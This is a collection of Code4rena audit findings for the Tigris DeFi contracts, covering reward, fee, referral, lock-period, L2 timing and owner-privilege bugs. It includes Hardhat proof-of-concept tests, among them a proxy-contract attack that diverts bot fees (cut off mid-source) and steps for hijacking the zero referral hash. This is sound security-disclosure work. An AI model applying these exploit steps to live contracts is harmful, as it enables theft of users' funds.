In GovNFT, setMaxBridge function is provided to set maxBridge, but this variable is not used, literally it should be used to limit the number of GovNFTs crossing chain, but it doesn't work in GovNFT.

```solidity
    uint256 public maxBridge = 20;
...
    function setMaxBridge(uint256 _max) external onlyOwner {
        maxBridge = _max;
    }
```

### Proof of Concept

<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L19-L20> 

<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L311-L313>

### Recommended Mitigation Steps

Consider applying the maxBridge variable.





***"
192.md,`safeTransferMany()` doesn't actually use safe transfer,medium,"*Submitted by [0xA5DF](https://github.com/code-423n4/2022-12-tigris-findings/issues/356), also found by [0xmuxyz](https://github.com/code-423n4/2022-12-tigris-findings/issues/412), [8olidity](https://github.com/code-423n4/2022-12-tigris-findings/issues/235), [0x4non](https://github.com/code-423n4/2022-12-tigris-findings/issues/80), and [HollaDieWaldfee](https://github.com/code-423n4/2022-12-tigris-findings/issues/29)*

<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L247> 

<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L285>

Both `BondNFT` and `GovNFT` are an ERC721 implementation, and they both also have a function named `safeTransferMany()` which its name implies is supposed to safe transfer many tokens at once.
However the function doesn't actually safe transfer.

### Impact

Users might use this function, expecting it to verify that the receiver is an `ERC721Receiver`, but will get their funds stuck in a contract that doesn't support ERC721.

### Proof of Concept

I've added the following tests to the `GovNFT` tests.

1st test will succeed (tx will revert) since `safeTransferFrom()` does actually use safe transfer.

2nd will fail (tx won't revert), since `safeTransferMany()` doesn't actually use a safe transfer.

```diff
diff --git a/test/05.GovNFT.js b/test/05.GovNFT.js
index 711a649..d927320 100644
--- a/test/05.GovNFT.js
+++ b/test/05.GovNFT.js
@@ -98,6 +98,14 @@ describe(""govnft"", function () {
       expect(await govnft.pending(owner.getAddress(), StableToken.address)).to.equal(1500);
       expect(await govnft.pending(user.getAddress(), StableToken.address)).to.equal(500);
     });
+
+    it(""Safe transfer to non ERC721Receiver"", async function () {
+      
+      expect(govnft.connect(owner)['safeTransferFrom(address,address,uint256)'](owner.address,StableToken.address, 2)).to.be.revertedWith(""ERC721: transfer to non ERC721Receiver implementer"");
+    });
+    it(""Safe transfer many  to non ERC721Receiver"", async function () {
+      await expect(govnft.connect(owner).safeTransferMany(StableToken.address, [2])).to.be.revertedWith(""ERC721: transfer to non ERC721Receiver implementer"");
+    });
     it(""Transferring an NFT with pending delisted rewards should not affect pending rewards"", async function () {
       await govnft.connect(owner).safeTransferMany(user.getAddress(), [2,3]);
       expect(await govnft.balanceOf(owner.getAddress())).to.equal(0);

```

Output (I've shortened the output. following test will also fail, since the successful transfer will affect them):

          ✔ Safe transfer to contract
          1) Safe transfer many to contract


      11 passing (3s)
      1 failing

      1) govnft
           Reward system related functions
             Safe transfer many to contract:

          AssertionError: Expected transaction to be reverted
          + expected - actual

          -Transaction NOT reverted.
          +Transaction reverted.

### Recommended Mitigation Steps

Call `_safeTransfer()` instead of `_transfer()`.

  


 >
> We decided that we do not want transfers to check that the receiver is implementing IERC721Receiver, so we renamed the functions.



***"
192.md,`BondNFT.extendLock` force a user to extend the bond at least for current bond.period,medium,"*Submitted by [carlitox477](https://github.com/code-423n4/2022-12-tigris-findings/issues/359)*

The current implementation forces a user to extend their bonds for at least they current bond period. This means that, for instance, a bond which was initially locked for 365 can never be extended, even after a week of being created.

If we consider that a bond should have at least a 7 days lock and at the most 365 days, then the current `BondNFT.extendLock` function should be refactored.

### Impact

*   Current `BondNFT.extendLock` function does not work as expected, forcing user who wants to extend their bond to extend them at least for their current bond.period.
*   For bonds which were set with a lock period of 365 days, they can not be extended, even after days of their creation.

### Proof of Concept

```typescript
// In 09.Bond.js,  describe ""Extending lock""
it(""POC: Extending the lock does not work as expected"", async function () {
      await stabletoken.connect(owner).mintFor(user.address, ethers.utils.parseEther(""100""));
      // user lock bond funds for 10 days
      await lock.connect(user).lock(StableToken.address, ethers.utils.parseEther(""100""), 10);

      const fiveDaysTime = 5 * 24 * 60 * 60
      const eightDaysTime = 8 * 24 * 60 * 60

      // owner distribute rewards
      console.log(""User created a lock for 10 days"")
      await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(""10""));
      await bond.connect(owner).distribute(stabletoken.address, ethers.utils.parseEther(""10""));

      // Five days pass
      await network.provider.send(""evm_increaseTime"", [fiveDaysTime]); // Skip 10 days
      await network.provider.send(""evm_mine"");
      console.log(""\n5 days pass"")

      // User decide to extend their lock three days, given the current implementation the user is forced to extended 13 days
      const bondInfoBeforeExtension = await bond.idToBond(1)
      console.log(`Bond info before extension: {period: ${bondInfoBeforeExtension.period}, expireEpoch: ${bondInfoBeforeExtension.expireEpoch}}`)
      
      await lock.connect(user).extendLock(1, 0, 3)
      console.log(""Bond was extended for 3 days"")
      const bondInfoAfterExtension = await bond.idToBond(1)
      console.log(`Bond info after extension: {period: ${bondInfoAfterExtension.period}, expireEpoch: ${bondInfoAfterExtension.expireEpoch}}`)

      // 8 days pass, user should be able to release the bond given the extension of 3 days (8 days should be enough)
      await network.provider.send(""evm_increaseTime"", [eightDaysTime]);
      await network.provider.send(""evm_mine"");
      console.log(""\n8 days later"")
      console.log(""After 13 days (10 original days + 3 days from extension) the user can not release the bond"")
      
      // The user decide to claim their part and get their bond amount
      // The user should recieve all the current funds in the contract
      await expect(lock.connect(user).release(1)).to.be.revertedWith('!expire')

    });
```

### Recommended Mitigation Steps

In order to `extendLock` to work properly, the current implementation  should be changed to:

```diff
function extendLock(
    uint _id,
    address _asset,
    uint _amount,
    uint _period,
    address _sender
) external onlyManager() {
    Bond memory bond = idToBond(_id);
    Bond storage _bond = _idToBond[_id];
    require(bond.owner == _sender, ""!owner"");
    require(!bond.expired, ""Expired"");
    require(bond.asset == _asset, ""!BondAsset"");
    require(bond.pending == 0); //Cannot extend a lock with pending rewards
+   uint currentEpoch = block.timestamp/DAY;
-   require(epoch[bond.asset] == block.timestamp/DAY, ""Bad epoch"");
    require(epoch[bond.asset] == currentEpoch, ""Bad epoch"");

+   uint pendingEpochs = bond.expireEpoch - currentEpoch;
+   uint newBondPeriod = pendingEpochs + _period;
+   //In order to respect min bond period when we extend a bon
+   // Next line can be omitted at discretion of the protocol and devs
+   // If it is omitted any created bond would be able to be extended always (except from those with period = 365)
+   require(newBondPeriod >= 7, ""MIN PERIOD"");

-    require(bond.period+_period <= 365, ""MAX PERIOD"");
+    require(newBondPeriod <= 365, ""MAX PERIOD"");
    
    unchecked {
-       uint shares = (bond.amount + _amount) * (bond.period + _period) / 365;
+       uint shares = (bond.amount + _amount) * newBondPeriod / 365;

-       uint expireEpoch = block.timestamp/DAY + bond.period + _period;
+       uint expireEpoch = currentEpoch + newBondPeriod;

        totalShares[bond.asset] += shares-bond.shares;
        _bond.shares = shares;
        _bond.amount += _amount;
        _bond.expireEpoch = expireEpoch;
        _bond.period += _period;
        _bond.mintTime = block.timestamp; 
-       _bond.mintEpoch = epoch[bond.asset];
+       _bond.mintEpoch = currentEpoch;
-       bondPaid[_id][bond.asset] = accRewardsPerShare[bond.asset][epoch[bond.asset]] * _bond.shares / 1e18;
+       bondPaid[_id][bond.asset] = accRewardsPerShare[bond.asset][currentEpoch] * _bond.shares / 1e18;
    }
    emit ExtendLock(_period, _amount, _sender,  _id);
}
```




***"
192.md,`_handleOpenFees` returns an incorrect value for `_feePaid`. This directly impacts margin calculations,medium,"*Submitted by [0Kage](https://github.com/code-423n4/2022-12-tigris-findings/issues/367), also found by [chaduke](https://github.com/code-423n4/2022-12-tigris-findings/issues/55)*

<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178> 

<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L734>

### Impact

Formula for `fee paid` in [Line 734](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L734) is incorrect leading to incorrect margin calculations. Since this directly impacts the trader margin and associated fee calculations, I've marked as HIGH risk.

On initiating a market order, `Margin` is adjusted for the `fees` that is charged by protocol. This adjustment is in [Line 178 of Trading](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178). Fees computed by ` _handleOpenFees  ` is deducted from Initial margin posted by user.

Formula misses to account for the `2*referralFee` component while calculaing `_feePaid`.

### Proof of Concept

Note that `_feePaid` as per formula in Line 734 is the sum of ` _daoFeesPaid`, and sum of  `burnerFee`&`botFee` .  `\_daoFeesPaid`is calculated from`\_fees.daoFees`which itself is calculated by subtracting`2\*referralFee`and`botFee\`.

So when we add back `burnerFee` and `botFee` to `_feePaid`, we are missing to add back the `2*referralFee`  which was earlier excluded when calculating `_daoFeesPaid`. While `botFee` is added back correctly, same adjustment is not being done viz-a-viz referral fee.

This results in under calculating the `_feePaid` and impacts the rewards paid to the protocol NFT holders.

### Recommended Mitigation Steps

Suggest replacing the formula in line 734 with below (adding back `\_fees.referralFees\*2`)

                _feePaid =
                    _positionSize
                    * (_fees.burnFees + _fees.botFees + _fees.referralFees*2 ) 
                    / DIVISION_CONSTANT // divide by 100%
                    + _daoFeesPaid;



***"
192.md,Centralization risks: owner can freeze withdraws and use timelock to steal all funds,medium,"*Submitted by [0xA5DF](https://github.com/code-423n4/2022-12-tigris-findings/issues/377), also found by [0xSmartContract](https://github.com/code-423n4/2022-12-tigris-findings/issues/668), [francoHacker](https://github.com/code-423n4/2022-12-tigris-findings/issues/648), [rbserver](https://github.com/code-423n4/2022-12-tigris-findings/issues/638), [kwhuo68](https://github.com/code-423n4/2022-12-tigris-findings/issues/619), [yjrwkk](https://github.com/code-423n4/2022-12-tigris-findings/issues/612), [0xNazgul](https://github.com/code-423n4/2022-12-tigris-findings/issues/600), [peanuts](https://github.com/code-423n4/2022-12-tigris-findings/issues/559), [wait](https://github.com/code-423n4/2022-12-tigris-findings/issues/553), [ladboy233](https://github.com/code-423n4/2022-12-tigris-findings/issues/529), [hansfriese](https://github.com/code-423n4/2022-12-tigris-findings/issues/514), [philogy](https://github.com/code-423n4/2022-12-tigris-findings/issues/499), [Mukund](https://github.com/code-423n4/2022-12-tigris-findings/issues/458),  [0xA5DF](https://github.com/code-423n4/2022-12-tigris-findings/issues/418), [\_\_141345\_\_](https://github.com/code-423n4/2022-12-tigris-findings/issues/407), [carlitox477](https://github.com/code-423n4/2022-12-tigris-findings/issues/386), [Madalad](https://github.com/code-423n4/2022-12-tigris-findings/issues/383), [jadezti](https://github.com/code-423n4/2022-12-tigris-findings/issues/370),  [cccz](https://github.com/code-423n4/2022-12-tigris-findings/issues/323), [SmartSek](https://github.com/code-423n4/2022-12-tigris-findings/issues/321), [chaduke](https://github.com/code-423n4/2022-12-tigris-findings/issues/311), [hihen](https://github.com/code-423n4/2022-12-tigris-findings/issues/305), [gz627](https://github.com/code-423n4/2022-12-tigris-findings/issues/273), [0xbepresent](https://github.com/code-423n4/2022-12-tigris-findings/issues/259), [Ruhum](https://github.com/code-423n4/2022-12-tigris-findings/issues/240), [8olidity](https://github.com/code-423n4/2022-12-tigris-findings/issues/232), [Faith](https://github.com/code-423n4/2022-12-tigris-findings/issues/224), [imare](https://github.com/code-423n4/2022-12-tigris-findings/issues/184), [HE1M](https://github.com/code-423n4/2022-12-tigris-findings/issues/176), [0xdeadbeef0x](https://github.com/code-423n4/2022-12-tigris-findings/issues/167), [aviggiano](https://github.com/code-423n4/2022-12-tigris-findings/issues/153), [JohnnyTime](https://github.com/code-423n4/2022-12-tigris-findings/issues/76), [orion](https://github.com/code-423n4/2022-12-tigris-findings/issues/45), [Englave](https://github.com/code-423n4/2022-12-tigris-findings/issues/24), and [gzeon](https://github.com/code-423n4/2022-12-tigris-findings/issues/19)*

<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L222-L230> 

<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L78-L83> 

<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableToken.sol#L38-L46> 

<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L48>

The project heavily relies on nodes/oracles, which are EOAs that sign the current price.

Since all functions (including withdrawing) require a recently-signed price, the owner(s) of those EOA can freeze all activity by not providing signed prices.

I got from the sponsor that the owner of the contract is going to be a timelock contract.
However, once the owner holds the power to pause withdrawals - that nullifies the timelock. The whole point of the timelock is to allow users to withdraw their funds when they see a pending malicious tx before it's executed. If the owner has the power to freeze users' funds in the contract, they wouldn't be able to do anything while the owner executes his malicious activity.

Besides that, there are also LP funds, which are locked to a certain period, and also can't withdraw their funds when they see a pending malicious timelock tx.

### Impact

The owner (or attacker who steals the owner's wallet) can steal all user's funds.

### Proof of Concept

*   The fact that the protocol relies on EOA signatures is pretty clear from the code and docs
*   The whole project relies on the 'StableVault' and 'StableToken'
    *   The value of the 'StableToken' comes from the real stablecoin that's locked in 'StableVault', if someone manages to empty the 'StableVault' from the deposited stablecoins the 'StableToken' would become worthless
*   The owner has a few ways to drain all funds:
    *   Replace the minter via `StableToken.setMinter()`, mint more tokens, and redeem them via `StableVault.withdraw()`
    *   List a fake token at `StableVault`, deposit it and withdraw real stablecoin
    *   List a new fake asset for trading with a fake chainlink oracle, fake profit with trading with fake prices, and then withdraw
        *   They can prevent other users from doing the same by setting `maxOi` and opening position in the same tx
    *   Replace the MetaTx forwarder and execute tx on behalf of users (e.g. transferring bonds, positions and StableToken from their account)

### Recommended Mitigation Steps

*   Rely on a contract (chainlink/Uniswap) solely as an oracle
*   Alternately, add functionality to withdraw funds at the last given price in case no signed data is given for a certain period
    *   You can do it by creating a challenge in which a user requests to close his position at a recent price, if no bot executes it for a while it can be executed at the last recorded price.
*   As for LPs' funds, I don't see an easy way around it (besides doing significant changes to the architecture of the protocol), this a risk LPs should be aware of and decide if they're willing to accept.


 > Also missing changes to Trading Extension and Referral Fees.
>
 > This report, in conjunction with [#648](https://github.com/code-423n4/2022-12-tigris-findings/issues/648) effectively covers all ""basic"" admin privilege findings. More nuanced issues are judged separately.



***"
192.md,One can become referral of hash 0x0 and because all users default referral hash is 0x0 so he would become all users referral by default and earn a lot of fees while users didn't approve it,medium,"*Submitted by [unforgiven](https://github.com/code-423n4/2022-12-tigris-findings/issues/379)*

<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Referrals.sol#L20-L24> 

<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/TradingExtension.sol#L148-L152>

### Impact

By default the value of `_referred[user]` is 0x0 for all users and if one set 0x0 as his referral hash then he would become referral for all the users who didn't set referral by default and he would earn a lot of referral funds that users didn't approve it.

### Proof of Concept

This is `createReferralCode()` code:

        function createReferralCode(bytes32 _hash) external {
            require(_referral[_hash] == address(0), ""Referral code already exists"");
            _referral[_hash] = _msgSender();
            emit ReferralCreated(_msgSender(), _hash);
        }

As you can see, attacker can become set 0x0 as his hash referral by calling `createReferralCode(0x0)` and code would set `_referral[0x0] = attackerAddress` (attacker needs to be the first one calling this).

Then in the `getRef()` code the logic would return `attackerAddress` as referral for all the users who didn't set referral.

        function getRef(
            address _trader
        ) external view returns(address) {
            return referrals.getReferral(referrals.getReferred(_trader));
        }

In the code, getReferred(trader) would return 0x0 because trader didn't set referred and getReferral(0x0) would return attackerAddress.

`_handleOpenFees()` and `_handleCloseFees()` function in the Trading contract would use `getRef(trader)` and they would transfer referral fee to attackerAddress and attacker would receive fee from a lot of users which didn't set any referral, those users didn't set any referral and didn't approve attacker receiving referral fees from them and because most of the users wouldn't know about this and referral codes so attacker would receive a lot of funds.

### Tools Used

VIM

### Recommended Mitigation Steps

Prevent someone from setting 0x0 hash for their referral code.






***"
192.md,`BondNFT.sol#claim()` needs to correct all the missing epochs,medium,"*Submitted by [\_\_141345\_\_](https://github.com/code-423n4/2022-12-tigris-findings/issues/392)*

<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L177-L183> 

<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L235-L242>

### Impact

In `BondNFT.sol#claim()`, `accRewardsPerShare[][]` is amended to reflect the expired shares. But only `accRewardsPerShare[bond.asset][epoch[bond.asset]]` is updated. All the epochs between `bond.expireEpoch-1` and `epoch[bond.asset]` are missed.

However, some users claimable rewards calculation could be based on the missed epochs. As a result, the impact might be:

*   `accRewardsPerShare` is inaccurate for the epochs in between.
*   Some users could lose reward due to wrong `accRewardsPerShare`, some users might receive undeserved rewards.
*   Some rewards will be locked in the contract.

### Proof of Concept

The rationale behind the unchecked block below seems to take into account the shares of reward of the expired bond. However, if you only update the latest epoch data, the epochs in between could have errors and lead to loss of other users.

```solidity
File: contracts/BondNFT.sol
168:     function claim(
169:         uint _id,
170:         address _claimer
171:     ) public onlyManager() returns(uint amount, address tigAsset) {
    
177:             if (bond.expired) {
178:                 uint _pendingDelta = (bond.shares * accRewardsPerShare[bond.asset][epoch[bond.asset]] / 1e18 - bondPaid[_id][bond.asset]) - (bond.shares * accRewardsPerShare[bond.asset][bond.expireEpoch-1] / 1e18 - bondPaid[_id][bond.asset]);
179:                 if (totalShares[bond.asset] > 0) {
180:                     accRewardsPerShare[bond.asset][epoch[bond.asset]] += _pendingDelta*1e18/totalShares[bond.asset];
181:                 }
182:             }
183:             bondPaid[_id][bond.asset] += amount;
```

Users can claim rewards up to the expiry time, based on `accRewardsPerShare[tigAsset][bond.expireEpoch-1]`:

```solidity
235:     function idToBond(uint256 _id) public view returns (Bond memory bond) {
    
238:         bond.expired = bond.expireEpoch <= epoch[bond.asset] ? true : false;
239:         unchecked {
240:             uint _accRewardsPerShare = accRewardsPerShare[bond.asset][bond.expired ? bond.expireEpoch-1 : epoch[bond.asset]];
241:             bond.pending = bond.shares * _accRewardsPerShare / 1e18 - bondPaid[_id][bond.asset];

```

 >
> I would downgrade it to Medium risk, needs an opinion from judge.





***"
192.md,`_checkDelay` will not work properly for Arbitrum or Optimism due to `block.number`,medium,"*Submitted by [0x52](https://github.com/code-423n4/2022-12-tigris-findings/issues/419)*

Trade delay will not work correctly on Arbitrum allowing users to exploit multiple valid prices.

### Proof of Concept

    function _checkDelay(uint _id, bool _type) internal {
        unchecked {
            Delay memory _delay = blockDelayPassed[_id];
            //in those situations
            if (_delay.actionType == _type) {
                blockDelayPassed[_id].delay = block.number + blockDelay;
            } else {
                if (block.number < _delay.delay) revert(""0""); //Wait
                blockDelayPassed[_id].delay = block.number + blockDelay;
                blockDelayPassed[_id].actionType = _type;
            }
        }
    }

`\_checkDelay` enforces a delay of a specific number of block between opening and closing a position. While this structure will work on mainnet, it is problematic for use on Arbitrum. 

According to Arbitrum [Docs](https://developer.offchainlabs.com/time) `block.number` returns the most recently synced L1 block number. Once per minute the block number in the Sequencer is synced to the actual L1 block number. This period could be abused to completely bypass this protection. 

The user would open their position 1 Arbitrum block before the sync happens, then close it the very next block. It would appear that there has been 5 blocks (60 / 12) since the last transaction but in reality it has only been 1 Arbitrum block. Given that Arbitrum has 2 seconds blocks it would be impossible to block this behavior through parameter changes.

It also presents an issue for [Optimism](https://community.optimism.io/docs/developers/build/differences/#block-numbers-and-timestamps) because each transaction is it's own block. No matter what value is used for the block delay, the user can pad enough tiny transactions to allow them to close the trade immediately.

### Recommended Mitigation Steps

The delay should be measured using `block.timestamp` rather than `block.number`.






***"
192.md,`distribute()` won't update `epoch[tigAsset]` when `totalShares[tigAsset]==0` which can cause later created bond for this tigAsset to have wrong mint epoch,medium,"*Submitted by [unforgiven](https://github.com/code-423n4/2022-12-tigris-findings/issues/436)*

<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L206-L228> 

<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L48-L86>

### Impact

Function `BondNFT.createLock()` creates a bond and it sets bond's mint epoch as `epoch[asset]`. Function `Lock.lock()` first calls `claimGovFees()` which calls `BondNFT.distribute()` for all assets and updates the `epoch[assets]` for all assets. So during normal bond creation, the value of `epoch[asset]` would be updated and bond would be created from `today` epoch to `today+period` epoch. But if `totalShares[tigAsset] == 0` for an asset, then `distribute()` won't update `epoch[asset]` for that asset and `epoch[asset]` will be some old epoch(will be the start time where asset is added or the time where `totalShares[_tigAsset] != 0`). This would make `createLock()` set very wrong values for bond's mint epoch when `totalShares[tigAsset] == 0`.

This would happen for the first bond that has been created for that asset always and it will happen again if for some period `totalShares[asset]` become 0, then the next bond would have wrong mint epoch. or `setAllowedAsset(asset, false)`  has been called for that asset.

### Proof of Concept

This is `distribute()` code in BondNFT contract:

    function distribute(
            address _tigAsset,
            uint _amount
        ) external {
            if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;
            IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);
            unchecked {
                uint aEpoch = block.timestamp / DAY;
                if (aEpoch > epoch[_tigAsset]) {
                    for (uint i=epoch[_tigAsset]; i<aEpoch; i++) {
                        epoch[_tigAsset] += 1;
                        accRewardsPerShare[_tigAsset][i+1] = accRewardsPerShare[_tigAsset][i];
                    }
                }
                accRewardsPerShare[_tigAsset][aEpoch] += _amount * 1e18 / totalShares[_tigAsset];
            }
            emit Distribution(_tigAsset, _amount);
        }

As you can see when `totalShares[_tigAsset] == 0`, then the value of `epoch[_tigAsset]` won't get updated to today. And there is no other logic in the code to update `epoch[tigAsset]`. So when `totalShares[_tigAsset] == 0`, then the value of the `epoch[tigAsset]` would be outdated. this would happen when an asset is recently added to the BondNFT assets or when there is no bond left.

When this condition happens and a user calls `Lock.lock()` to create a bond, the `lock()` function would call `claimGovFees()` to update rewards in BondNFT but because for that asset the value of totalShares are 0, that asset `epoch[]` won't get updated and in the `BondNFT.createLock()`, the wrong value would set as bond's mint epoch.

This is `Lock.lock()` code:

        function lock(
            address _asset,
            uint _amount,
            uint _period
        ) public {
            require(_period <= maxPeriod, ""MAX PERIOD"");
            require(_period >= minPeriod, ""MIN PERIOD"");
            require(allowedAssets[_asset], ""!asset"");

            claimGovFees();

            IERC20(_asset).transferFrom(msg.sender, address(this), _amount);
            totalLocked[_asset] += _amount;
            
            bondNFT.createLock( _asset, _amount, _period, msg.sender);
        }

And this is `BondNFT.createLock()` code:

        function createLock(
            address _asset,
            uint _amount,
            uint _period,
            address _owner
        ) external onlyManager() returns(uint id) {
            require(allowedAsset[_asset], ""!Asset"");
            unchecked {
                uint shares = _amount * _period / 365;
                uint expireEpoch = epoch[_asset] + _period;
                id = ++totalBonds;
                totalShares[_asset] += shares;
                Bond memory _bond = Bond(
                    id,             // id
                    address(0),     // owner
                    _asset,         // tigAsset token
                    _amount,        // tigAsset amount
                    epoch[_asset],  // mint epoch
                    block.timestamp,// mint timestamp
                    expireEpoch,    // expire epoch
                    0,              // pending
                    shares,         // linearly scaling share of rewards
                    _period,        // lock period
                    false           // is expired boolean
                );
                _idToBond[id] = _bond;
                _mint(_owner, _bond);
            }
            emit Lock(_asset, _amount, _period, _owner, id);
        }

If a bond gets wrong value for mint epoch, it would have wrong value for expired epoch and user would get a lot of shares by lock for small time. 

For example this scenario:

1.  Let's assume `epoch[asset1]` is outdated and it shows 30 days ago epoch. (`allowedAsset[asset1]` was false so locking was not possible and then is set as true after 30 days)
2.  During this time, because `totalShare[asset1]` was 0, the `distribute()` function won't update `epoch[asset1]` and `epoch[asset1]` would show 30 days ago.
3.  Attacker would create a lock for 32 days by calling `Lock.lock(asset1)`. Code would call `BondNFT.createLock()` and would create a bond for attacker which epoch start time is 30 days ago and epoch expire time is 2 days later and attacker receives shares for 32 days.
4.  Some reward would get distributed into the BondNFT for the `asset1`.
5.  Other users would create lock too.
6.  Attacker would claim his rewards and his rewards would be for 32 day locking but attacker lock his tokens for 2 days in reality.

So attacker was able to create lock for a long time and get shares and rewards based on that, but attacker can release lock after short time.

### Tools Used

VIM

### Recommended Mitigation Steps

Update `epoch[asset]` in `distribute()` function  even when `totalShares[_tigAsset]` is equal to 0. Only the division by zero and fund transfer should be prevented when totalShare is zero and `epoch[asset]` index should be updated.

 





***"
192.md,"User can close an order via `limitClose()`, and take bot fees to themselves",medium,"*Submitted by [0xA5DF](https://github.com/code-423n4/2022-12-tigris-findings/issues/468)*

Bot fees are used when a position is opened/closed via a bot. In that case a bot fee is subtracted from the DAO fee and sent to the closing bot.
A user can use that  to reduce the DAO fees for closing an order and keeping it to themselves.

Instead of closing the order via `initiateClose()`, the user can use a proxy contract to update the stop-loss value and then `limitClose()` the order.
Since that is done in one function call, no bot can run the `limitClose()` and the bot fee will go to the user.

### Proof of Concept

The following PoC shows how a trade is closed by a proxy contract that sets the limit and closes it via `limitClose()`:

```diff
diff --git a/test/07.Trading.js b/test/07.Trading.js
index ebe9948..e50b0cc 100644
--- a/test/07.Trading.js
+++ b/test/07.Trading.js
@@ -17,6 +17,7 @@ describe(""Trading"", function () {
 
   let TradingExtension;
   let tradingExtension;
+  let myTrader;
 
   let TradingLibrary;
   let tradinglibrary;
@@ -37,7 +38,7 @@ describe(""Trading"", function () {
 
   let MockDAI;
   let MockUSDC;
-  let mockusdc;
+  let mockusdc, mockdai;
 
   let badstablevault;
 
@@ -55,6 +56,7 @@ describe(""Trading"", function () {
     const Position = await deployments.get(""Position"");
     position = await ethers.getContractAt(""Position"", Position.address);
     MockDAI = await deployments.get(""MockDAI"");
+    mockdai = await ethers.getContractAt(""MockERC20"", MockDAI.address);
     MockUSDC = await deployments.get(""MockUSDC"");
     mockusdc = await ethers.getContractAt(""MockERC20"", MockUSDC.address);
     const PairsContract = await deployments.get(""PairsContract"");
@@ -84,6 +86,10 @@ describe(""Trading"", function () {
     TradingLibrary = await deployments.get(""TradingLibrary"");
     tradinglibrary = await ethers.getContractAt(""TradingLibrary"", TradingLibrary.address);
     await trading.connect(owner).setLimitOrderPriceRange(1e10);
+
+
+    let mtFactory = await ethers.getContractFactory(""MyTrader"");
+    myTrader = await mtFactory.deploy(Trading.address, Position.address);
   });
   describe(""Check onlyOwner and onlyProtocol"", function () {
     it(""Set max win percent"", async function () {
@@ -536,6 +542,31 @@ describe(""Trading"", function () {
       expect(await position.assetOpenPositionsLength(0)).to.equal(1); // Trade has opened
       expect(await stabletoken.balanceOf(owner.address)).to.equal(parseEther(""0"")); // Should no tigAsset left
     });
+
+    it(""Test my trader"", async function () {
+      let TradeInfo = [parseEther(""1000""), MockDAI.address, StableVault.address, parseEther(""10""), 0, true, parseEther(""0""), parseEther(""0""), ethers.constants.HashZero];
+      let PriceData = [node.address, 0, parseEther(""20000""), 0, 2000000000, false];
+      let message = ethers.utils.keccak256(
+        ethers.utils.defaultAbiCoder.encode(
+          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
+          [node.address, 0, parseEther(""20000""), 0, 2000000000, false]
+        )
+      );
+      let sig = await node.signMessage(
+        Buffer.from(message.substring(2), 'hex')
+      );
+      
+      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];
+      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);
+
+
+      await trading.connect(owner).approveProxy(myTrader.address, 1e10);
+      await myTrader.connect(owner).closeTrade(1, PriceData, sig);
+
+
+    });
+  return;
+
     it(""Closing over 100% should revert"", async function () {
       let TradeInfo = [parseEther(""1000""), MockDAI.address, StableVault.address, parseEther(""10""), 0, true, parseEther(""0""), parseEther(""0""), ethers.constants.HashZero];
       let PriceData = [node.address, 0, parseEther(""20000""), 0, 2000000000, false];
@@ -551,8 +582,10 @@ describe(""Trading"", function () {
       
       let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];
       await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);
+
       await expect(trading.connect(owner).initiateCloseOrder(1, 1e10+1, PriceData, sig, StableVault.address, StableToken.address, owner.address)).to.be.revertedWith(""BadClosePercent"");
     });
+    return;
     it(""Closing 0% should revert"", async function () {
       let TradeInfo = [parseEther(""1000""), MockDAI.address, StableVault.address, parseEther(""10""), 0, true, parseEther(""0""), parseEther(""0""), ethers.constants.HashZero];
       let PriceData = [node.address, 0, parseEther(""20000""), 0, 2000000000, false];
@@ -700,6 +733,7 @@ describe(""Trading"", function () {
       expect(margin).to.equal(parseEther(""500""));
     });
   });
+  return;
   describe(""Trading using <18 decimal token"", async function () {
     it(""Opening and closing a position with tigUSD output"", async function () {
       await pairscontract.connect(owner).setAssetBaseFundingRate(0, 0); // Funding rate messes with results because of time

```

`MyTrader.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ITrading} from ""../interfaces/ITrading.sol"";
import ""../utils/TradingLibrary.sol"";
import ""../interfaces/IPosition.sol"";
import {ERC20} from ""@openzeppelin/contracts/token/ERC20/extensions/draft-ERC20Permit.sol"";




contract MyTrader{

    ITrading trading;
    IPosition position;

    receive() payable external{

    }

